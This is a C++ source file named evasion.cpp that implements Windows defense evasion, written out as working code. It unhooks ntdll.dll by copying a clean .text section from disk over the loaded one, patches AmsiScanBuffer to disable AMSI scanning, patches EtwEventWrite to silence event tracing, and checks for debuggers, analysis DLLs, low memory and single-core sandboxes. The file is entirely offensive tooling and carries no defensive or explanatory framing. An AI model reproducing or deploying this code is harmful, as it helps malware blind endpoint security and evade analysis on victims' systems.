// evasion.cpp - NTDLL .text Section Unhooking, AMSI & ETW Memory Patching
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "psapi.lib")

extern "C" {

// ---------- ACCURATE NTDLL .TEXT SECTION RESTORATION (UNHOOKING) ----------
BOOL UnhookNtdll() {
    MODULEINFO modInfo = { 0 };
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    HANDLE hProcess = GetCurrentProcess();
    if (!GetModuleInformation(hProcess, hNtdll, &modInfo, sizeof(MODULEINFO))) {
        return FALSE;
    }
    
    LPVOID pNtdllBase = (LPVOID)hNtdll;
    
    // Open clean NTDLL from System32 on disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    LPVOID pCleanBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Parse headers of loaded in-memory NTDLL
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        UnmapViewOfFile(pCleanBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    
    // Locate .text section and restore pristine bytes from clean image
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            LPVOID pTargetText = (LPVOID)((PBYTE)pNtdllBase + pSection->VirtualAddress);
            LPVOID pSourceText = (LPVOID)((PBYTE)pCleanBase + pSection->VirtualAddress);
            SIZE_T textSize = pSection->Misc.VirtualSize;
            
            DWORD oldProtect = 0;
            if (VirtualProtect(pTargetText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pTargetText, pSourceText, textSize);
                VirtualProtect(pTargetText, textSize, oldProtect, &oldProtect);
            }
            break;
        }
    }
    
    UnmapViewOfFile(pCleanBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}

// ---------- AMSI MEMORY PATCH (x64 / x86 Safe) ----------
void BypassAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    
    void* pAmsiScan = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return;
    
    DWORD oldProtect = 0;
    if (VirtualProtect(pAmsiScan, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
#if defined(_M_X64) || defined(__x86_64__)
        // x64: mov eax, 0x80070057 (E_INVALIDARG) ; ret
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
        // x86: mov eax, 0x80070057 ; ret 0x0018
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
        memcpy(pAmsiScan, patch, sizeof(patch));
        VirtualProtect(pAmsiScan, 16, oldProtect, &oldProtect);
    }
}

// ---------- ETW DISABLE PATCH (EtwEventWrite) ----------
void PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    void* pEtwWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwWrite) return;
    
    DWORD oldProtect = 0;
    if (VirtualProtect(pEtwWrite, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
#if defined(_M_X64) || defined(__x86_64__)
        // x64: xor rax, rax ; ret (STATUS_SUCCESS)
        unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
#else
        // x86: xor eax, eax ; ret 0x0014
        unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        memcpy(pEtwWrite, patch, sizeof(patch));
        VirtualProtect(pEtwWrite, 16, oldProtect, &oldProtect);
    }
}

// ---------- SANDBOX & TIMING JITTER EVASION ----------
BOOL CheckSandboxArtifacts() {
    if (IsDebuggerPresent()) return TRUE;
    
    // Check for common VM vendor DLLs loaded in current space
    if (GetModuleHandleA("sbiedll.dll") != NULL ||
        GetModuleHandleA("dbghelp.dll") != NULL ||
        GetModuleHandleA("api_log.dll") != NULL ||
        GetModuleHandleA("dir_watch.dll") != NULL) {
        return TRUE;
    }
    
    // Check physical memory (< 2 GB indicates common sandbox instance)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
            return TRUE;
        }
    }
    
    // Check CPU core count (single core usually sandboxes)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    return FALSE;
}

}
